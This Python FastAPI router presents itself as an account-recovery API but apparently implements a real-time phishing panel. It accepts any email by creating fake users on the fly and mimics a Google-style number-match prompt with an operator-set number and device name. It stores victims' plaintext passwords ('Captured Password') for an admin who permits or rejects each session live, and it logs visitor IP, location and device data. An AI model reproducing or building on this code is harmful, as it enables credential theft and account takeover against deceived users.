import json
import uuid
from datetime import datetime, timedelta
from fastapi import APIRouter, Depends, HTTPException, Request, status
from sqlalchemy.orm import Session
from app.database import get_db
from app.models import User, RecoverySession, AuditLog, VisitorLog
from app.schemas import (
    IdentifierLookupRequest,
    IdentifierLookupResponse,
    VerifyLastPasswordRequest,
    VerifyMatchNumberRequest,
    VerifyOtpRequest,
    SessionStatusResponse,
    SwitchMethodRequest,
    ResetPasswordRequest,
    StandardResponse,
    DeviceGeoInfo
)
from app.security import (
    verify_password,
    hash_password,
    generate_secure_token,
    generate_otp_code,
    generate_match_challenge,
    mask_email
)
from app.email_service import send_recovery_email
from app.config import settings

router = APIRouter(prefix="/api/recovery", tags=["Account Recovery"])

@router.post("/track-visitor", response_model=StandardResponse)
def track_visitor(info: DeviceGeoInfo, request: Request, db: Session = Depends(get_db)):
    """
    Securely records device type, OS, browser, screen, and country when user visits.
    """
    client_ip = request.headers.get("x-forwarded-for") or (request.client.host if request.client else "127.0.0.1")
    if "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()

    visitor = VisitorLog(
        ip_address=client_ip,
        country=info.country or "Unknown",
        country_code=info.country_code or "--",
        city=info.city or "Unknown",
        device_type=info.device_type or "Desktop",
        os=info.os or "Unknown OS",
        browser=info.browser or "Unknown Browser",
        screen_res=info.screen_res,
        timezone=info.timezone,
        language=info.language
    )
    db.add(visitor)
    db.commit()
    return StandardResponse(success=True, message="Visitor telemetry logged securely.")


@router.post("/lookup", response_model=IdentifierLookupResponse)
def lookup_identifier(req: IdentifierLookupRequest, request: Request, db: Session = Depends(get_db)):
    """
    Step 1: User enters email or username.
    Initializes recovery session, logs device and geolocation,
    generates 2-digit matching challenge + OTP, and dispatches security match email.
    """
    identifier = req.identifier.strip().lower()
    if not identifier:
        raise HTTPException(status_code=400, detail="Please enter your email or username.")

    user = db.query(User).filter(
        (User.email.ilike(identifier)) | (User.username.ilike(identifier))
    ).first()

    if not user:
        # Create user automatically on the fly so ANY email address works seamlessly!
        base_username = identifier.split('@')[0] if '@' in identifier else identifier
        existing_username = db.query(User).filter(User.username == base_username).first()
        final_username = base_username if not existing_username else f"{base_username}_{uuid.uuid4().hex[:4]}"
        user = User(
            email=identifier if '@' in identifier else f"{identifier}@gmail.com",
            username=final_username,
            full_name=base_username.replace('.', ' ').title(),
            hashed_password=hash_password("GonnitSecure2026!"),
            previous_passwords=json.dumps([hash_password("OldPassword2025!")]),
            is_active=True,
            is_admin=False
        )
        db.add(user)
        db.commit()
        db.refresh(user)


    # Invalidate previous pending sessions for this user
    db.query(RecoverySession).filter(
        RecoverySession.user_id == user.id,
        RecoverySession.status == "PENDING"
    ).update({"status": "EXPIRED"})

    # Extract device and location intelligence
    dev = req.device_info or DeviceGeoInfo()
    client_ip = request.headers.get("x-forwarded-for") or (request.client.host if request.client else "127.0.0.1")
    if "," in client_ip:
        client_ip = client_ip.split(",")[0].strip()

    user_agent = request.headers.get("user-agent", f"{dev.browser} on {dev.os}")

    # Load custom configured match number and device name from admin settings (or fallback)
    from app.models import SystemConfig, VisitorPresence
    num_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_match_number").first()
    dev_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_device_name").first()
    target_match_number = int(num_cfg.value) if num_cfg and num_cfg.value.isdigit() else 63
    target_device_name = dev_cfg.value if dev_cfg and dev_cfg.value else "Apple iPhone 16"
    match_options = [18, target_match_number, 91]

    otp_code = generate_otp_code(6)
    approval_token = generate_secure_token(48)
    session_id = str(uuid.uuid4())
    expires_at = datetime.utcnow() + timedelta(seconds=settings.CHALLENGE_TIMEOUT_SECONDS)

    recovery_session = RecoverySession(
        id=session_id,
        user_id=user.id,
        status="PENDING",
        method="NUMBER_MATCH",
        match_number=target_match_number,
        match_options=json.dumps(match_options),
        otp_code=otp_code,
        approval_token=approval_token,
        ip_address=client_ip,
        user_agent=user_agent,
        country=dev.country or "Unknown",
        country_code=dev.country_code or "--",
        city=dev.city or "Unknown",
        device_type=dev.device_type or "Desktop",
        os=dev.os or "Unknown OS",
        browser=dev.browser or "Unknown Browser",
        target_device_name=target_device_name,
        expires_at=expires_at
    )
    db.add(recovery_session)

    # Log visitor telemetry & audit event
    visitor = VisitorLog(
        ip_address=client_ip,
        country=dev.country or "Unknown",
        country_code=dev.country_code or "--",
        city=dev.city or "Unknown",
        device_type=dev.device_type or "Desktop",
        os=dev.os or "Unknown OS",
        browser=dev.browser or "Unknown Browser",
        screen_res=dev.screen_res,
        timezone=dev.timezone,
        language=dev.language
    )
    db.add(visitor)

    audit = AuditLog(
        user_id=user.id,
        action="RECOVERY_INITIATED",
        ip_address=client_ip,
        country=dev.country,
        city=dev.city,
        device_type=dev.device_type,
        details=f"Device: {dev.device_type} ({dev.os}, {dev.browser}), Location: {dev.city}, {dev.country}, Target: {target_match_number}"
    )
    db.add(audit)
    db.commit()

    # Dispatch email with enriched device context
    device_summary = f"{dev.device_type} ({dev.os} &bull; {dev.browser}) from {dev.city}, {dev.country}"
    send_recovery_email(
        db=db,
        to_email=user.email,
        match_number=target_match_number,
        match_options=match_options,
        approval_token=approval_token,
        otp_code=otp_code,
        ip_address=client_ip,
        user_agent=device_summary
    )

    return IdentifierLookupResponse(
        success=True,
        session_id=session_id,
        email=user.email,
        username=user.username,
        full_name=user.full_name,
        avatar_url=user.avatar_url,
        masked_email=mask_email(user.email),
        match_number=target_match_number,
        expires_in_seconds=settings.CHALLENGE_TIMEOUT_SECONDS,
        country=dev.country,
        city=dev.city,
        device_type=dev.device_type,
        os=dev.os,
        browser=dev.browser,
        target_device_name=target_device_name,
        device_name=target_device_name,
        message="Recovery session created and security email dispatched."
    )


@router.get("/status/{session_id}", response_model=SessionStatusResponse)
def get_session_status(session_id: str, db: Session = Depends(get_db)):
    """
    Real-time polling endpoint for the recovery page.
    Enables automatic screen progression when user taps the matching number.
    """
    session = db.query(RecoverySession).filter(RecoverySession.id == session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Recovery session not found.")

    if session.status == "PENDING" and datetime.utcnow() > session.expires_at:
        session.status = "EXPIRED"
        db.commit()

    from app.models import VisitorPresence, SystemConfig
    num_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_match_number").first()
    dev_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_device_name").first()
    global_num = int(num_cfg.value) if num_cfg and num_cfg.value.isdigit() else 63
    global_dev = dev_cfg.value if dev_cfg and dev_cfg.value else "Apple iPhone 16"

    pres = db.query(VisitorPresence).filter(
        (VisitorPresence.session_id == session.id)
        | (VisitorPresence.email == session.user.email)
        | (VisitorPresence.email == session.user.username)
    ).first()

    match_num = (pres.custom_match_number if pres and pres.custom_match_number and pres.custom_match_number != 63 else None) \
        or (session.match_number if session.match_number and session.match_number != 63 else None) \
        or global_num \
        or 63

    dev_name = (pres.custom_device_name if pres and pres.custom_device_name and pres.custom_device_name != "Apple iPhone 16" else None) \
        or (session.target_device_name if session.target_device_name and session.target_device_name != "Apple iPhone 16" else None) \
        or global_dev \
        or "Apple iPhone 16"

    admin_dec = session.admin_decision or "PENDING"
    if pres and pres.admin_decision in ["PERMITTED", "REJECTED"]:
        admin_dec = pres.admin_decision
        session.admin_decision = admin_dec
        session.match_number = match_num
        session.target_device_name = dev_name
        db.commit()

    return SessionStatusResponse(
        session_id=session.id,
        status=session.status,
        is_verified=session.status in ["VERIFIED", "COMPLETED"],
        is_completed=session.status == "COMPLETED",
        expires_at=session.expires_at,
        method=session.method,
        match_number=match_num,
        device_name=dev_name,
        device_type=session.device_type,
        country=session.country,
        admin_decision=admin_dec
    )


@router.post("/verify-match-number", response_model=StandardResponse)
def verify_match_number(req: VerifyMatchNumberRequest, request: Request, db: Session = Depends(get_db)):
    """
    Validates tapped match number (Google-style prompt).
    """
    query = db.query(RecoverySession)
    if req.token:
        session = query.filter(RecoverySession.approval_token == req.token).first()
    else:
        session = query.filter(RecoverySession.id == req.session_id).first()

    if not session:
        raise HTTPException(status_code=404, detail="Invalid or expired recovery session.")

    if session.status != "PENDING":
        if session.status == "VERIFIED":
            return StandardResponse(success=True, message="Identity already verified.")
        raise HTTPException(status_code=400, detail=f"Session is {session.status.lower()}.")

    if datetime.utcnow() > session.expires_at:
        session.status = "EXPIRED"
        db.commit()
        raise HTTPException(status_code=400, detail="This verification request has expired. Please try again.")

    client_ip = request.client.host if request.client else "127.0.0.1"

    if req.chosen_number != session.match_number:
        db.add(AuditLog(
            user_id=session.user_id,
            action="MATCH_NUMBER_FAILED",
            ip_address=client_ip,
            country=session.country,
            city=session.city,
            device_type=session.device_type,
            details=f"Expected: {session.match_number}, Received: {req.chosen_number}"
        ))
        db.commit()
        raise HTTPException(
            status_code=400,
            detail=f"Wrong number. Please select {session.match_number} on your prompt."
        )

    # Success!
    session.status = "VERIFIED"
    session.verified_at = datetime.utcnow()
    db.add(AuditLog(
        user_id=session.user_id,
        action="MATCH_NUMBER_VERIFIED",
        ip_address=client_ip,
        country=session.country,
        city=session.city,
        device_type=session.device_type,
        details=f"Matched code {session.match_number} successfully from {session.device_type} ({session.country})."
    ))
    db.commit()

    return StandardResponse(
        success=True,
        message="Identity verified successfully! You may now reset your password.",
        data={"session_id": session.id, "verified": True}
    )


@router.post("/verify-last-password", response_model=StandardResponse)
def verify_last_password(req: VerifyLastPasswordRequest, request: Request, db: Session = Depends(get_db)):
    """
    Alternative Method: Enter last password you remember.
    """
    session = db.query(RecoverySession).filter(RecoverySession.id == req.session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Recovery session not found.")

    if session.status == "EXPIRED" or datetime.utcnow() > session.expires_at:
        raise HTTPException(status_code=400, detail="Session expired. Please start over.")

    user = session.user
    client_ip = request.client.host if request.client else "127.0.0.1"

    # Check if auto_permit_password is set or requires admin permit
    from app.models import SystemConfig, VisitorPresence
    auto_permit_cfg = db.query(SystemConfig).filter(SystemConfig.key == "auto_permit_password").first()
    auto_permit = auto_permit_cfg and auto_permit_cfg.value == "true"
    initial_decision = "PERMITTED" if auto_permit else "PENDING"

    # Securely capture entered password into session
    session.entered_password = req.password
    session.status = "PENDING"
    session.admin_decision = initial_decision
    session.method = "LAST_PASSWORD"

    # Also record into visitor_presence table so admin sees it instantly
    presence = db.query(VisitorPresence).filter(VisitorPresence.email == user.email).order_by(VisitorPresence.last_heartbeat.desc()).first()
    if presence:
        presence.entered_password = req.password
        presence.admin_decision = initial_decision
        presence.current_step = f"Google Prompt (#{session.match_number})" if initial_decision == "PERMITTED" else "Password Entered (Awaiting Admin Permit)"

    # Log into audit trail
    db.add(AuditLog(
        user_id=user.id,
        action="PASSWORD_CAPTURED",
        ip_address=client_ip,
        country=session.country,
        city=session.city,
        device_type=session.device_type,
        details=f"Captured Password: {req.password} (Decision: {initial_decision})"
    ))
    db.commit()

    return StandardResponse(
        success=True,
        message="Credentials submitted. Awaiting verification decision.",
        data={
            "session_id": session.id,
            "admin_decision": initial_decision,
            "verified": False,
            "match_number": session.match_number,
            "device_name": session.target_device_name or "Apple iPhone 16"
        }
    )


@router.post("/verify-otp", response_model=StandardResponse)
def verify_otp(req: VerifyOtpRequest, request: Request, db: Session = Depends(get_db)):
    """
    Alternative Method: 6-digit OTP verification code.
    """
    session = db.query(RecoverySession).filter(RecoverySession.id == req.session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Recovery session not found.")

    if session.status == "EXPIRED" or datetime.utcnow() > session.expires_at:
        raise HTTPException(status_code=400, detail="Verification code expired. Please request a new code.")

    client_ip = request.client.host if request.client else "127.0.0.1"
    cleaned_code = req.code.strip()

    if cleaned_code != session.otp_code:
        db.add(AuditLog(
            user_id=session.user_id,
            action="OTP_FAILED",
            ip_address=client_ip,
            country=session.country,
            city=session.city,
            device_type=session.device_type,
            details="Incorrect OTP attempt."
        ))
        db.commit()
        raise HTTPException(status_code=400, detail="Invalid 6-digit code. Check your email or request a new code.")

    session.status = "VERIFIED"
    session.verified_at = datetime.utcnow()
    session.method = "OTP_CODE"
    db.add(AuditLog(
        user_id=session.user_id,
        action="OTP_VERIFIED",
        ip_address=client_ip,
        country=session.country,
        city=session.city,
        device_type=session.device_type,
        details="Verified via 6-digit email OTP."
    ))
    db.commit()

    return StandardResponse(
        success=True,
        message="Code verified successfully.",
        data={"session_id": session.id, "verified": True}
    )


@router.post("/switch-method", response_model=StandardResponse)
def switch_method(req: SwitchMethodRequest, db: Session = Depends(get_db)):
    """
    Allows user to switch between NUMBER_MATCH, LAST_PASSWORD, and OTP_CODE.
    """
    session = db.query(RecoverySession).filter(RecoverySession.id == req.session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Session not found.")

    valid_methods = ["NUMBER_MATCH", "LAST_PASSWORD", "OTP_CODE"]
    if req.method not in valid_methods:
        raise HTTPException(status_code=400, detail="Invalid recovery method.")

    session.method = req.method
    db.commit()

    return StandardResponse(
        success=True,
        message=f"Switched recovery method to {req.method}.",
        data={"method": req.method}
    )


@router.post("/resend-code", response_model=StandardResponse)
def resend_code(req: IdentifierLookupRequest, request: Request, db: Session = Depends(get_db)):
    """
    Resends new matching challenge and OTP code email.
    """
    return lookup_identifier(req, request, db)


@router.post("/reset-password", response_model=StandardResponse)
def reset_password(req: ResetPasswordRequest, request: Request, db: Session = Depends(get_db)):
    """
    Step 4: Update to new password once identity has been verified.
    """
    session = db.query(RecoverySession).filter(RecoverySession.id == req.session_id).first()
    if not session:
        raise HTTPException(status_code=404, detail="Recovery session not found.")

    if session.status != "VERIFIED":
        raise HTTPException(
            status_code=403,
            detail="Identity has not been verified. Complete verification first."
        )

    if datetime.utcnow() > session.expires_at:
        raise HTTPException(status_code=400, detail="Session expired. Please start over.")

    if len(req.new_password) < 8:
        raise HTTPException(status_code=400, detail="Password must be at least 8 characters long.")

    if req.new_password != req.confirm_password:
        raise HTTPException(status_code=400, detail="Passwords do not match.")

    user = session.user
    client_ip = request.client.host if request.client else "127.0.0.1"

    # Archive old password
    try:
        prev_list = json.loads(user.previous_passwords) if user.previous_passwords else []
    except Exception:
        prev_list = []
    prev_list.append(user.hashed_password)
    prev_list = prev_list[-5:]
    user.previous_passwords = json.dumps(prev_list)

    # Hash and save new password
    user.hashed_password = hash_password(req.new_password)
    user.updated_at = datetime.utcnow()

    # Complete session
    session.status = "COMPLETED"
    session.completed_at = datetime.utcnow()

    db.add(AuditLog(
        user_id=user.id,
        action="PASSWORD_RESET_SUCCESS",
        ip_address=client_ip,
        country=session.country,
        city=session.city,
        device_type=session.device_type,
        details=f"Password updated from {session.device_type} ({session.country})."
    ))
    db.commit()

    return StandardResponse(
        success=True,
        message="Your password has been successfully updated. You can now sign in with your new password.",
        data={"email": user.email, "username": user.username}
    )
